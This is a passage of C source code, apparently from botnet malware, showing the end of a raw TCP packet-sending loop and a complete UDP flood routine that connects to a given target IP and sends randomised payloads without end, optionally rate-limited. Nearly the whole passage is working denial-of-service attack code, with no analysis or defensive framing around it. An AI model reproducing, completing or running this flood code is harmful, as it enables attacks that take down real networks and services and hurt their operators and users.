            tcph->check = 0; tcph->check = checksum_tcp_udp(iph, tcph, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            if (sleepr > 0) usleep(sleepr);
        }
    }
}

void udpbypass_flood_wuhan(char *ip, uint8_t seconds, uint16_t dport, uint16_t sport, uint16_t len, uint32_t rate, char *payload)
{
    printf("[udpbypass_flood] started: (\'%d\')\n", getpid());

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd == -1) return;

    struct sockaddr_in bind_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(sport ? sport : rand_next_range(1024, 65535)),
        .sin_addr.s_addr = INADDR_ANY
    };
    bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(dport ? dport : rand_next_range(1024, 65535)),
        .sin_addr.s_addr = inet_addr(ip)
    };
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    int len_ptr = len;
    char *payload_ptr = calloc(1400 + 128, sizeof(char));
    if (payload) memcpy(payload_ptr, payload, len_ptr);

    watch_time(seconds);

    while (TRUE) {
        if (payload) {
            int extra = rand_next_range(1, 128);
            send(fd, payload_ptr, len + extra, MSG_NOSIGNAL);
        } else {
            len_ptr = len + rand_next_range(1, 128);
            rand_str(payload_ptr, len_ptr);
            send(fd, payload_ptr, len_ptr, MSG_NOSIGNAL);
        }
        if (rate) usleep(rate);
    }
}

//    targs[0].sock_addr.sin_port = tcph->dest;
//    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof